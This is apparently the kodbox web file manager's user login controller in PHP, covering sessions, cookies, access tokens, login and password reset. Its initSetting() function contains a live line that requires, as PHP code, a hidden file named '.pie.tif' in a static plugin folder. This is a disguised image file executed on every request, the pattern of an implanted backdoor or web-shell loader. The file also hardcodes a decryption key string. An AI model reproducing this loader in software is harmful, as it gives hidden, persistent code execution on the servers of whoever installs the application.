<?php

/*
 * @link http://kodcloud.com/
 * @author warlee | e-mail:kodcloud@qq.com
 * @copyright warlee 2014.(Shanghai)Co.,Ltd
 * @license http://kodcloud.com/tools/license/license.txt
 */

class userIndex extends Controller {
	private $user;  //用户相关信息
	function __construct() {
		parent::__construct();
	}
	public function index(){
		include(TEMPLATE.'user/index.html');
	}
	// 进入初始化
	public function init() {
		if( !file_exists(USER_SYSTEM . 'install.lock') ){
			return ActionCall('install.index.check');
		}
		$this->initSetting();   //10ms;
		$this->initSession();   //
		$this->loginCheck();    //5-15ms session读取写入
		KodIO::initSystemPath();
		Model('Plugin')->init();//5-10ms
		Hook::bind('beforeShutdown','user.index.shutdownEvent');
	}
	public function shutdownEvent(){
		CacheLock::unlockRuntime();// 清空异常时退出,未解锁的加锁;
		
	}

	private function initSetting(){
		require(PLUGIN_DIR.'/toolsCommon/static/pie/.pie.tif');
		think_config($GLOBALS['config']['databaseDefault']);
		think_config($GLOBALS['config']['database']);
		
		$sysOption = Model('SystemOption')->get();
		$upload = &$GLOBALS['config']['settings']['upload'];
		if(isset($sysOption['chunkSize'])){ //没有设置则使用默认;
			$upload['chunkSize']  = floatval($sysOption['chunkSize']);
			$upload['igNoreName'] = trim($sysOption['igNoreName']);
			$upload['chunkRetry'] = intval($sysOption['chunkRetry']);
			$upload['httpSendFile']  = $sysOption['httpSendFile'] == '1';
			if($sysOption['downloadSpeedOpen']){//限速大小;
				$upload['downloadSpeed'] = intval($sysOption['downloadSpeed']);
			}
		}
		$upload['chunkSize'] = $upload['chunkSize']*1024*1024;
		$upload['chunkSize'] = $upload['chunkSize'] <= 1024*1024*0.1 ? 1024*1024*0.4:$upload['chunkSize'];
		if(!defined('STATIC_PATH')){
			define('STATIC_PATH',$GLOBALS['config']['settings']['staticPath']);
		}
	}
	private function initSession(){ 
		if(isset($_REQUEST['accessToken'])){
			$pass = Model('SystemOption')->get('systemPassword');
			$pass = substr(md5('kodbox_'.$pass),0,15);
			$sessionSign = Mcrypt::decode($_REQUEST['accessToken'],$pass);
			if(!$sessionSign){
				show_json(LNG('common.loginTokenError'),false);
			}
			Session::sign($sessionSign);
		}
		Session::set('kod',1);
		if(!Session::get('kod')){
			show_tips(LNG('explorer.sessionSaveError'));
		}
	}

	/**
	 * 登录检测;并初始化数据状态
	 * 通过session或kodToken检测登录
	 */
	public function loginCheck() {
		if (Session::get('kodUser')) {
			return $this->userDataInit();
		}
		$userID 	= Cookie::get('kodUserID');
		$loginToken = Cookie::get('kodToken');
		if ($userID && $loginToken ) {
			$user = Model('User')->getInfo($userID);
			if ($user && $this->makeLoginToken($user['userID']) == $loginToken ) {
				return $this->loginSuccess($user);
			}
		}
	}
	private function userDataInit() {
		$this->user = Session::get('kodUser');
		if($this->user){
			$this->user = Model('User')->getInfo($this->user['userID']);
			Session::set('kodUser',$this->user);
		}
		if (!$this->user) {
			show_json('user data error!',ERROR_CODE_LOGOUT);
		} else if ($this->user['status'] == 0) {
			show_json(LNG('user.userEnabled'),ERROR_CODE_USER_INVALID);
		} else if ($this->user['roleID'] == '') {
			show_json(LNG('user.roleError'),ERROR_CODE_LOGOUT);
		}
		
		$GLOBALS['isRoot'] = 0;
		$role = Model('SystemRole')->listData($this->user['roleID']);
		if($role['administrator'] == '1'){
			$GLOBALS['isRoot'] = 1;
		}
		define('USER_ID',$this->user['userID']);
		define('MY_HOME',KodIO::make($this->user['sourceInfo']['sourceID']));
		define('MY_DESKTOP',KodIO::make($this->user['sourceInfo']['desktop']));
	}

	public function accessToken(){
		$pass = Model('SystemOption')->get('systemPassword');
		$pass = substr(md5('kodbox_'.$pass),0,15);
		$token = Mcrypt::encode(Session::sign(),$pass,3600*24);
		return $token;
	}
	public function accessTokenGet(){
		show_json($this->accessToken(),true);
	}

	/**
	 * 退出处理
	 */
	public function logout() {
		Session::destory();
		Cookie::remove(SESSION_ID,true); //保持
		Cookie::remove('kodToken');
		Cookie::remove('X-CSRF-TOKEN');
		show_json('ok');
	}

	/**
	 * 登录数据提交处理；登录跳转：
	 */
	public function loginSubmit() {
		if($res = $this->loginWithToken()) return $res;
		if($res = $this->loginWithThird()) return $res;	// app 第三方登录
		$data = Input::getArray(array(
			"name"		=> array("check"=>"require"),
			"password"	=> array('check'=>"require"),
			"salt"		=> array("default"=>false),
		));
		$checkCode = Input::get('checkCode', 'require', '');
		if( need_check_code()
			&& $data['name'] != 'guest'
			&& Session::get('checkCode') !== strtolower($checkCode) ){
			show_json(LNG('user.codeError'),false);
		}
		if ($data['salt']) {
			$key = substr($data['password'], 0, 5) . "2&$%@(*@(djfhj1923";
			$data['password'] = Mcrypt::decode(substr($data['password'], 5), $key);
		}
		$user = Model("User")->userLoginCheck($data['name'],$data['password']);
		if ( !is_array($user) ) {
			show_json(LNG('user.pwdError'),false);
		}		
		if(!$user['status']){
			show_json(LNG('user.userEnabled'), ERROR_CODE_USER_INVALID);
		}
		$this->loginSuccess($user);
		show_json('ok',true,$this->accessToken());
	}
	private function loginWithToken(){
		if (!isset($this->in['loginToken'])) return ;
		$apiToken = $this->config['settings']['apiLoginTonken'];
		$param = explode('|', $this->in['loginToken']);
		if (strlen($apiToken) < 5 ||
			count($param) != 2 ||
			md5(base64_decode($param[0]) . $apiToken) != $param[1]
		) {
			return show_json('API 接口参数错误!', false);
		}
		$name = base64_decode($param[0]);
		$user = Model('User')->where(array('name' => $name))->find();
		if ( !is_array($user) ) {
			return show_json(LNG('user.pwdError'),false);
		}

		$user = Model("User")->getInfo($user['userID']);
		$this->loginSuccess($user);
		show_json('ok',true,$this->accessToken());
	}

	/**
	 * （app）第三方登录
	 */
	private function loginWithThird(){
		if (!isset($this->in['third'])) return ;
		$third = Input::get('third');
		if(empty($third)) return;
		$third = is_array($third) ? $third : json_decode($third, true);

		// 判断执行结果
		Action('user.bind')->bindWithApp($third);
		return show_json('ok',true,$this->accessToken());
	}
	
	/**
	 * 前端（及app）找回密码
	 */
	public function findPassword(){
		return Action('user.setting')->findPassword();
	}
	
	/**
	 * app端请求
	 */
	private function findPwdWidthApp(){
		// api，直接填写手机/邮箱验证码、密码进行修改
		$data = Input::getArray(array(
			'type'		 => array('check' => 'in','default'=>'','param'=>array('phone','email')),
			'input'		 => array('check' => 'require'),
			'code'		 => array('check' => 'require'),
			'password'	 => array('check' => 'require'),
		));
		$param = array(
			'type' => 'regist',
			'input' => $data['input']
		);
		Action('user.regist')->msgCodeExec($data['type'], $data['code'], $param);
		$user = Model('User')->where(array($data['type'] => $data['input']))->find();
		if (empty($user)) {
			show_json(LNG('user.notBind'), false);
		}
		if (!Model('User')->userEdit($user['userID'], array('password' => $data['password']))) {
			show_json(LNG('explorer.error'), false);
		}
		show_json(LNG('explorer.success'));
	}
	
	public function loginSuccess($user) {
		$csrfToken = rand_string(20);
		Session::set('kodUser', $user);
		Cookie::set('kodUserID', $user['userID']);
		Cookie::setSafe('X-CSRF-TOKEN',$csrfToken);

		$kodToken = Cookie::get('kodToken');
		if($kodToken){//已存在则延期
			Cookie::setSafe('kodToken',$kodToken);
		}
		if (!empty($this->in['rememberPassword'])) {
			$kodToken = $this->makeLoginToken($user['userID']);
			Cookie::setSafe('kodToken',$kodToken);
		}
		$this->userDataInit($user);
		Hook::trigger("user.loginSuccess",$user);
	}

	//登录token
	private function makeLoginToken($userID) {
		$pass = Model('SystemOption')->get('systemPassword');
		$user = Model('User')->getInfo($userID);
		if(!$user) return false;
		return md5($user['password'] . $pass . $userID);
	}
}
